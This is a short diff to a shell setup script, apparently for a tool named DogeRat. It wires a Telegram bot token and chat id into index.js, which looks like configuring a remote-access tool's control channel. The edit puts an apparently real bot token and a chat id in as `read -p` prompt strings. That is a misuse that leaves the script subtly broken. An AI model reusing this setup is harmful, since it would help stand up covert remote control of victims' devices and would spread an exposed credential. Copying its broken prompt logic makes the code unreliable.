@@ -66,7 +66,7 @@ else
     rm node_modules.zip
 fi
 
-read -p "https://dogerat-modi.onrender.com" token
+read -p "7336735604:AAH3vITr21scYcJQlJ8En3ky7PzTiro0CRg" token
 read -p "730766357" id
 sed -i "s/const token = 'your token here'/const token = '$token'/g" index.js
 sed -i "s/const id = 'chat id here'/const id = '$id'/g" index.js
